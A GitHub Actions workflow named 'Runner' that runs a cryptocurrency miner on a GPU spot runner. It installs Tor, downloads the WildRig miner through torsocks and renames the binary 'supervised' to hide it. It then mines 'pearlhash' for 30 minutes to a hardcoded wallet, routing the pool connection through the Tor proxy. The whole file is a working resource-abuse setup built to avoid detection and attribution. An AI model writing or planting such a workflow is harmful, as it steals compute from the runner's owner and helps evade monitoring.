name: Runner

on:
  workflow_dispatch:
    inputs:
      runs_left:
        type: number
        required: false
        description: "Additional runs remaining"
        default: 4

permissions:
  contents: read

jobs:
  gpu-task:
    name: RTX 6000 Runner (30-minute timeout)
    if: ${{ inputs.runs_left != 1 }}
    runs-on: machine/id=${{ github.run_id }}/gpu=l40s/architecture=x64/tenancy=spot/regions=eu-south-2
    timeout-minutes: 30

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Install and bootstrap Tor
        shell: bash
        run: |
          set -euo pipefail

          sudo apt-get update -y
          sudo apt-get install -y tor torsocks

          sudo systemctl stop tor@default tor 2>/dev/null || true
          sudo pkill -TERM -x tor 2>/dev/null || true
          sleep 2
          sudo pkill -KILL -x tor 2>/dev/null || true
          sleep 1

          nohup tor -f /etc/tor/torrc > "$HOME/tor.log" 2>&1 &
          TOR_PID=$!
          echo "Tor PID: $TOR_PID"

          BOOTSTRAPPED=0
          for i in $(seq 1 180); do
            if grep -q "Bootstrapped 100%" "$HOME/tor.log"; then
              BOOTSTRAPPED=1
              echo "Tor bootstrap completed successfully."
              break
            fi

            if ! kill -0 "$TOR_PID" 2>/dev/null; then
              echo "Tor exited before bootstrap completed."
              cat "$HOME/tor.log"
              exit 1
            fi

            sleep 1
          done

          if [ "$BOOTSTRAPPED" -ne 1 ]; then
            echo "Tor failed to bootstrap within 180 seconds."
            tail -n 60 "$HOME/tor.log"
            exit 1
          fi

          tail -n 20 "$HOME/tor.log"

          SOCKS_READY=0
          for i in $(seq 1 15); do
            if timeout 5 bash -c '</dev/tcp/127.0.0.1/9050' 2>/dev/null; then
              SOCKS_READY=1
              echo "Tor SOCKS port 9050 is listening."
              break
            fi
            sleep 1
          done

          if [ "$SOCKS_READY" -ne 1 ]; then
            echo "Tor SOCKS port 9050 is unavailable."
            cat "$HOME/tor.log"
            exit 1
          fi

      - name: Download and prepare miner through Tor
        shell: bash
        run: |
          set -euo pipefail

          BASE="https://github.com/andru-kun/"
          REPO="wildrig-multi/releases/download/0.51.7/"
          FILE="wildrig-multi-linux-0.51.7.tar.gz"
          URL="${BASE}${REPO}${FILE}"

          torsocks wget -O supervised.tar.gz "$URL"

          mkdir -p supervised
          tar -xzf supervised.tar.gz -C supervised

          BIN="$(find supervised -type f -name '*multi*' -print -quit)"
          if [ -z "$BIN" ]; then
            echo "Miner executable not found in archive."
            find supervised -maxdepth 3 -type f
            exit 1
          fi

          mv "$BIN" supervised/supervised
          chmod +x supervised/supervised

      - name: Verify Tor connectivity
        shell: bash
        run: |
          set -euo pipefail
          torsocks curl --fail --silent --show-error \
            --max-time 20 \
            https://check.torproject.org/api/ip
          echo

      - name: Run miner with bounded shutdown
        timeout-minutes: 30
        shell: bash
        run: |
          set -uo pipefail

          timeout \
            --signal=TERM \
            --kill-after=5s \
            30m \
            ./supervised/supervised \
              --algo pearlhash \
              --url stratum+ssl://pool.pearlhash.xyz:9443 \
              --user prl1p3kf32rgus4fvwfvg8u7hhtrkl35zpetnygdcgc6y0scf3mqrxqhqj7hjk4 \
              --worker tt \
              --proxy 127.0.0.1:9050

          rc=$?
          echo "Miner/timeout exit code: $rc"

          if [ "$rc" -eq 124 ] || [ "$rc" -eq 137 ]; then
            echo "Mining time limit reached or process required forced termination."
            exit 0
          fi

          exit "$rc"
